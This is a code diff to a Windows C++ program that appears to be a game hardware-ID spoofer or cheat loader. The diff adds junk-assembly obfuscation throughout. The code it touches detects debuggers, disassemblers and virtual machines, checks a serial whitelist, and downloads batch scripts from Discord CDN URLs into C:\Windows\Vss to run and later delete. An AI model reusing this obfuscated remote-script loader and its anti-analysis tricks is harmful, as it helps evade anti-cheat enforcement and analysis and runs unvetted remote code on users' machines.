@@ -17,9 +17,21 @@
 #include <TlHelp32.h>
 #include "Headers/antidbg.h"
 #include <cstdio>
+#define JUNK_CODE_ONE        \
+    __asm{push eax}            \
+    __asm{xor eax, eax}        \
+    __asm{setpo al}            \
+    __asm{push edx}            \
+    __asm{xor edx, eax}        \
+    __asm{sal edx, 2}        \
+    __asm{xchg eax, edx}    \
+    __asm{pop edx}            \
+    __asm{or eax, ecx}        \
+    __asm{pop eax}
 using namespace junkcode;
 
 #define SHOW_DEBUG_MESSAGES
+
 
 int CheckTEB()
 {
@@ -37,6 +49,7 @@ int CheckTEB()
     }
     return isBeingDebugged;
 }
+
 bool IsProcessRunning(const wchar_t* processName)
 {
     bool exists = false;
@@ -105,7 +118,17 @@ void DBG_MSG(WORD dbg_code, const char* message)
 {
 #ifdef SHOW_DEBUG_MESSAGES
 
-
+    rydekem();
+    lnttirs();
+    tlmisir();
+    JUNK_CODE_ONE
+        JUNK_CODE_ONE
+        JUNK_CODE_ONE
+        JUNK_CODE_ONE
+        JUNK_CODE_ONE
+        rydekem();
+    lnttirs();
+    tlmisir();
     OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
         TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
         TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
@@ -125,7 +148,17 @@ void adbg_CheckRemoteDebuggerPresent(void)
 
     if (found)
     {
-
+        rydekem();
+        lnttirs();
+        tlmisir();
+        JUNK_CODE_ONE
+            JUNK_CODE_ONE
+            JUNK_CODE_ONE
+            JUNK_CODE_ONE
+            JUNK_CODE_ONE
+            rydekem();
+        lnttirs();
+        tlmisir();
         rydekem();
         lnttirs();
         tlmisir();
@@ -176,20 +209,21 @@ void trampoline(void (*fnptr)(), bool ping = false)
 #pragma comment(lib, "urlmon.lib")
 #pragma comment(lib,"Wininet.lib") 
 using namespace junkcode;
-#define JUNK_CODE_ONE        \
-    __asm{push eax}            \
-    __asm{xor eax, eax}        \
-    __asm{setpo al}            \
-    __asm{push edx}            \
-    __asm{xor edx, eax}        \
-    __asm{sal edx, 2}        \
-    __asm{xchg eax, edx}    \
-    __asm{pop edx}            \
-    __asm{or eax, ecx}        \
-    __asm{pop eax}
+
 void startup();
 bool MemoryBreakpointDebuggerCheck()
 {
+    rydekem();
+    lnttirs();
+    tlmisir();
+    JUNK_CODE_ONE
+        JUNK_CODE_ONE
+        JUNK_CODE_ONE
+        JUNK_CODE_ONE
+        JUNK_CODE_ONE
+        rydekem();
+    lnttirs();
+    tlmisir();
     unsigned char* pMem = NULL;
     SYSTEM_INFO sysinfo = { 0 };
     DWORD OldProtect = 0;
@@ -245,6 +279,17 @@ inline int AddSubOne(int One, int Two)
 
 void SizeOfImage()
 {
+    rydekem();
+    lnttirs();
+    tlmisir();
+    JUNK_CODE_ONE
+        JUNK_CODE_ONE
+        JUNK_CODE_ONE
+        JUNK_CODE_ONE
+        JUNK_CODE_ONE
+        rydekem();
+    lnttirs();
+    tlmisir();
     // Any unreasonably large value will work say for example 0x100000 or 100,000h
     __asm
     {
@@ -255,23 +300,21 @@ void SizeOfImage()
     }
 }
 
-#define JUNK_CODE_ONE        \
-    __asm{push eax}            \
-    __asm{xor eax, eax}        \
-    __asm{setpo al}            \
-    __asm{push edx}            \
-    __asm{xor edx, eax}        \
-    __asm{sal edx, 2}        \
-    __asm{xchg eax, edx}    \
-    __asm{pop edx}            \
-    __asm{or eax, ecx}        \
-    __asm{pop eax}
-
-
 
 
 void apex()
 {
+    rydekem();
+    lnttirs();
+    tlmisir();
+    JUNK_CODE_ONE
+        JUNK_CODE_ONE
+        JUNK_CODE_ONE
+        JUNK_CODE_ONE
+        JUNK_CODE_ONE
+        rydekem();
+    lnttirs();
+    tlmisir();
     rydekem();
     lnttirs();
     tlmisir();
@@ -291,6 +334,17 @@ void gta()
     rydekem();
     lnttirs();
     tlmisir();
+    JUNK_CODE_ONE
+        JUNK_CODE_ONE
+        JUNK_CODE_ONE
+        JUNK_CODE_ONE
+        JUNK_CODE_ONE
+        rydekem();
+    lnttirs();
+    tlmisir();
+    rydekem();
+    lnttirs();
+    tlmisir();
 
 
     std::string gta = (XorStr("https://cdn.discordapp.com/attachments/834754431249285140/880114574483918858/gta.bat"));
@@ -302,6 +356,17 @@ void gta()
 }
 void fortnite()
 {
+    rydekem();
+    lnttirs();
+    tlmisir();
+    JUNK_CODE_ONE
+        JUNK_CODE_ONE
+        JUNK_CODE_ONE
+        JUNK_CODE_ONE
+        JUNK_CODE_ONE
+        rydekem();
+    lnttirs();
+    tlmisir();
     rydekem();
     lnttirs();
     tlmisir();
@@ -318,6 +383,17 @@ void fishingplanet()
     rydekem();
     lnttirs();
     tlmisir();
+    JUNK_CODE_ONE
+        JUNK_CODE_ONE
+        JUNK_CODE_ONE
+        JUNK_CODE_ONE
+        JUNK_CODE_ONE
+        rydekem();
+    lnttirs();
+    tlmisir();
+    rydekem();
+    lnttirs();
+    tlmisir();
 
     std::string fishingplanet = (XorStr("https://cdn.discordapp.com/attachments/834754431249285140/880114571648593931/fishing-planet.bat"));
     std::string fishingplanetpath = "C:\\Windows\\Vss\\Fishing-planet.bat";
@@ -328,6 +404,17 @@ void fishingplanet()
 }
 void cod()
 {
+    rydekem();
+    lnttirs();
+    tlmisir();
+    JUNK_CODE_ONE
+        JUNK_CODE_ONE
+        JUNK_CODE_ONE
+        JUNK_CODE_ONE
+        JUNK_CODE_ONE
+        rydekem();
+    lnttirs();
+    tlmisir();
     rydekem();
     lnttirs();
     tlmisir();
@@ -343,6 +430,17 @@ void cod()
 
 
 void cleaner() {
+    rydekem();
+    lnttirs();
+    tlmisir();
+    JUNK_CODE_ONE
+        JUNK_CODE_ONE
+        JUNK_CODE_ONE
+        JUNK_CODE_ONE
+        JUNK_CODE_ONE
+        rydekem();
+    lnttirs();
+    tlmisir();
     rydekem();
     lnttirs();
     tlmisir();
@@ -458,6 +556,17 @@ void deleter()
     rydekem();
     lnttirs();
     tlmisir();
+    JUNK_CODE_ONE
+        JUNK_CODE_ONE
+        JUNK_CODE_ONE
+        JUNK_CODE_ONE
+        JUNK_CODE_ONE
+        rydekem();
+    lnttirs();
+    tlmisir();
+    rydekem();
+    lnttirs();
+    tlmisir();
 
 
     //delete the files we downloaded
@@ -475,6 +584,17 @@ void deleter()
 
 void safeshutdown()
 {
+    rydekem();
+    lnttirs();
+    tlmisir();
+    JUNK_CODE_ONE
+        JUNK_CODE_ONE
+        JUNK_CODE_ONE
+        JUNK_CODE_ONE
+        JUNK_CODE_ONE
+        rydekem();
+    lnttirs();
+    tlmisir();
     rydekem();
     lnttirs();
     tlmisir();
@@ -525,6 +645,17 @@ void driverdetect()
     rydekem();
     lnttirs();
     tlmisir();
+    JUNK_CODE_ONE
+        JUNK_CODE_ONE
+        JUNK_CODE_ONE
+        JUNK_CODE_ONE
+        JUNK_CODE_ONE
+        rydekem();
+    lnttirs();
+    tlmisir();
+    rydekem();
+    lnttirs();
+    tlmisir();
 
     const TCHAR* devices[] = {
 _T("\\\\.\\Dumper"),
@@ -553,7 +684,17 @@ void spoofer()
     rydekem();
     lnttirs();
     tlmisir();
-
+    rydekem();
+    lnttirs();
+    tlmisir();
+    JUNK_CODE_ONE
+        JUNK_CODE_ONE
+        JUNK_CODE_ONE
+        JUNK_CODE_ONE
+        JUNK_CODE_ONE
+        rydekem();
+    lnttirs();
+    tlmisir();
 
 
 
@@ -615,6 +756,17 @@ void loadserial()
     rydekem();
     lnttirs();
     tlmisir();
+    JUNK_CODE_ONE
+        JUNK_CODE_ONE
+        JUNK_CODE_ONE
+        JUNK_CODE_ONE
+        JUNK_CODE_ONE
+        rydekem();
+    lnttirs();
+    tlmisir();
+    rydekem();
+    lnttirs();
+    tlmisir();
 
 
     serial.push_back(XorStr("384604182").c_str());
@@ -630,6 +782,17 @@ void mainbot()
     rydekem();
     lnttirs();
     tlmisir();
+    JUNK_CODE_ONE
+        JUNK_CODE_ONE
+        JUNK_CODE_ONE
+        JUNK_CODE_ONE
+        JUNK_CODE_ONE
+        rydekem();
+    lnttirs();
+    tlmisir();
+    rydekem();
+    lnttirs();
+    tlmisir();
 
 
 
@@ -640,7 +803,17 @@ void mainbot()
     DWORD fileSystemFlags = 0;
 
 
-
+    rydekem();
+    lnttirs();
+    tlmisir();
+    JUNK_CODE_ONE
+        JUNK_CODE_ONE
+        JUNK_CODE_ONE
+        JUNK_CODE_ONE
+        JUNK_CODE_ONE
+        rydekem();
+    lnttirs();
+    tlmisir();
     rydekem();
     lnttirs();
     tlmisir();
@@ -649,7 +822,17 @@ void mainbot()
     if (GetVolumeInformation(_T("C:\\"), volumeName, ARRAYSIZE(volumeName), &serialNumber, &maxComponentLen, &fileSystemFlags, fileSystemName, ARRAYSIZE(fileSystemName)));
     while (true)
     {
-
+        rydekem();
+        lnttirs();
+        tlmisir();
+        JUNK_CODE_ONE
+            JUNK_CODE_ONE
+            JUNK_CODE_ONE
+            JUNK_CODE_ONE
+            JUNK_CODE_ONE
+            rydekem();
+        lnttirs();
+        tlmisir();
 
         rydekem();
         lnttirs();
@@ -661,7 +844,17 @@ void mainbot()
             tlmisir();
 
             MemoryBreakpointDebuggerCheck();
-
+            rydekem();
+            lnttirs();
+            tlmisir();
+            JUNK_CODE_ONE
+                JUNK_CODE_ONE
+                JUNK_CODE_ONE
+                JUNK_CODE_ONE
+                JUNK_CODE_ONE
+                rydekem();
+            lnttirs();
+            tlmisir();
 
             rydekem();
             lnttirs();
@@ -689,7 +882,17 @@ void mainbot()
             std::cout << GREEN << "\nloading in memory...";
             Sleep(2400);
             system(XorStr("cls").c_str());
-
+            rydekem();
+            lnttirs();
+            tlmisir();
+            JUNK_CODE_ONE
+                JUNK_CODE_ONE
+                JUNK_CODE_ONE
+                JUNK_CODE_ONE
+                JUNK_CODE_ONE
+                rydekem();
+            lnttirs();
+            tlmisir();
 
             cleaner();
             fishingplanet();
@@ -700,6 +903,16 @@ void mainbot()
             spoofer();
             rydekem();
             lnttirs();
+            tlmisir(); 
+            lnttirs();
+            tlmisir();
+            JUNK_CODE_ONE
+                JUNK_CODE_ONE
+                JUNK_CODE_ONE
+                JUNK_CODE_ONE
+                JUNK_CODE_ONE
+                rydekem();
+            lnttirs();
             tlmisir();
 
         }
@@ -709,14 +922,34 @@ void mainbot()
             rydekem();
             lnttirs();
             tlmisir();
-
+            rydekem();
+            lnttirs();
+            tlmisir();
+            JUNK_CODE_ONE
+                JUNK_CODE_ONE
+                JUNK_CODE_ONE
+                JUNK_CODE_ONE
+                JUNK_CODE_ONE
+                rydekem();
+            lnttirs();
+            tlmisir();
 
             system(XorStr("cls").c_str());
             std::cout << CYAN << "Sorry but you are not in our database or you are banned. " << std::endl;
             std::cout << GREEN << "serial : ";
             std::cout << serialNumber << std::endl;
             Sleep(3000);
-
+            rydekem();
+            lnttirs();
+            tlmisir();
+            JUNK_CODE_ONE
+                JUNK_CODE_ONE
+                JUNK_CODE_ONE
+                JUNK_CODE_ONE
+                JUNK_CODE_ONE
+                rydekem();
+            lnttirs();
+            tlmisir();
             rydekem();
             lnttirs();
             tlmisir();
@@ -771,7 +1004,17 @@ void otherthing()
 }
 void HideFromDebugger()
 {
-
+    rydekem();
+    lnttirs();
+    tlmisir();
+    JUNK_CODE_ONE
+        JUNK_CODE_ONE
+        JUNK_CODE_ONE
+        JUNK_CODE_ONE
+        JUNK_CODE_ONE
+        rydekem();
+    lnttirs();
+    tlmisir();
     OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
         TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
         TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
@@ -813,23 +1056,66 @@ inline bool HideThread(HANDLE hThread)
 void startup();
 int _start()
 {
-
-
+    trampoline;
+    rydekem();
+    lnttirs();
+    tlmisir();
+    JUNK_CODE_ONE
+        JUNK_CODE_ONE
+        JUNK_CODE_ONE
+        JUNK_CODE_ONE
+        JUNK_CODE_ONE
+        rydekem();
+    lnttirs();
+    tlmisir();
     HideThread;
     startup();
     return 0;
-
-
+    rydekem();
+    lnttirs();
+    tlmisir();
+    JUNK_CODE_ONE
+        JUNK_CODE_ONE
+        JUNK_CODE_ONE
+        JUNK_CODE_ONE
+        JUNK_CODE_ONE
+        rydekem();
+    lnttirs();
+    tlmisir();
+    trampoline;
 }
+
 void startup()
 {
-
+    trampoline;
+    rydekem();
+    lnttirs();
+    tlmisir();
+    JUNK_CODE_ONE
+        JUNK_CODE_ONE
+        JUNK_CODE_ONE
+        JUNK_CODE_ONE
+        JUNK_CODE_ONE
+        rydekem();
+    lnttirs();
+    tlmisir();
+    trampoline;
 
 
     LPCWSTR windowName = L"x32dbg";
     LPCWSTR vmname = L"VMware Workstation";
 
-
+    rydekem();
+    lnttirs();
+    tlmisir();
+    JUNK_CODE_ONE
+        JUNK_CODE_ONE
+        JUNK_CODE_ONE
+        JUNK_CODE_ONE
+        JUNK_CODE_ONE
+        rydekem();
+    lnttirs();
+    tlmisir();
 
 
 
@@ -847,6 +1133,16 @@ void startup()
         SetLastError(1);
         exit(0);
     }
+    lnttirs();
+    tlmisir();
+    JUNK_CODE_ONE
+        JUNK_CODE_ONE
+        JUNK_CODE_ONE
+        JUNK_CODE_ONE
+        JUNK_CODE_ONE
+        rydekem();
+    lnttirs();
+    tlmisir();
     if (IsDebuggerPresent())
     {
         trampoline;
@@ -860,7 +1156,17 @@ void startup()
         SetLastError(1);
         exit(0);
     }
-
+    rydekem();
+    lnttirs();
+    tlmisir();
+    JUNK_CODE_ONE
+        JUNK_CODE_ONE
+        JUNK_CODE_ONE
+        JUNK_CODE_ONE
+        JUNK_CODE_ONE
+        rydekem();
+    lnttirs();
+    tlmisir();
     if (FindWindow(NULL, windowName))
     {
         trampoline;
@@ -875,7 +1181,17 @@ void startup()
         exit(0);
 
     }
-
+    rydekem();
+    lnttirs();
+    tlmisir();
+    JUNK_CODE_ONE
+        JUNK_CODE_ONE
+        JUNK_CODE_ONE
+        JUNK_CODE_ONE
+        JUNK_CODE_ONE
+        rydekem();
+    lnttirs();
+    tlmisir();
     if (FindWindow(NULL, vmname))
     {
         trampoline;
@@ -891,7 +1207,17 @@ void startup()
 
     }
 
-
+    rydekem();
+    lnttirs();
+    tlmisir();
+    JUNK_CODE_ONE
+        JUNK_CODE_ONE
+        JUNK_CODE_ONE
+        JUNK_CODE_ONE
+        JUNK_CODE_ONE
+        rydekem();
+    lnttirs();
+    tlmisir();
 
 
 
@@ -899,7 +1225,17 @@ void startup()
 
     if (GetLastError == 0)
     {
-
+        rydekem();
+        lnttirs();
+        tlmisir();
+        JUNK_CODE_ONE
+            JUNK_CODE_ONE
+            JUNK_CODE_ONE
+            JUNK_CODE_ONE
+            JUNK_CODE_ONE
+            rydekem();
+        lnttirs();
+        tlmisir();
         rydekem();
         lnttirs();
         tlmisir();
@@ -922,6 +1258,17 @@ void startup()
             JUNK_CODE_ONE
             JUNK_CODE_ONE
         mainbot();
+        rydekem();
+        lnttirs();
+        tlmisir();
+        JUNK_CODE_ONE
+            JUNK_CODE_ONE
+            JUNK_CODE_ONE
+            JUNK_CODE_ONE
+            JUNK_CODE_ONE
+            rydekem();
+        lnttirs();
+        tlmisir();
 
     }
 
@@ -931,6 +1278,17 @@ void startup()
 
 int main()
 {
+    rydekem();
+    lnttirs();
+    tlmisir();
+    JUNK_CODE_ONE
+        JUNK_CODE_ONE
+        JUNK_CODE_ONE
+        JUNK_CODE_ONE
+        JUNK_CODE_ONE
+        rydekem();
+    lnttirs();
+    tlmisir();
     if (IsProcessRunning(L"ida.exe"))
     {
         trampoline;
@@ -949,6 +1307,17 @@ int main()
         SetLastError(1);
         exit(0);
     }
+    rydekem();
+    lnttirs();
+    tlmisir();
+    JUNK_CODE_ONE
+        JUNK_CODE_ONE
+        JUNK_CODE_ONE
+        JUNK_CODE_ONE
+        JUNK_CODE_ONE
+        rydekem();
+    lnttirs();
+    tlmisir();
     if (IsProcessRunning(L"ProcessHacker.exe"))
     {
         trampoline;
@@ -1254,7 +1623,7 @@ int main()
         JUNK_CODE_ONE
             JUNK_CODE_ONE
             JUNK_CODE_ONE
-
+        trampoline;
         _start();
         trampoline;
         rydekem();
@@ -1286,6 +1655,7 @@ int main()
         rydekem();
         lnttirs();
         tlmisir();
+        
         JUNK_CODE_ONE
             JUNK_CODE_ONE
             JUNK_CODE_ONE
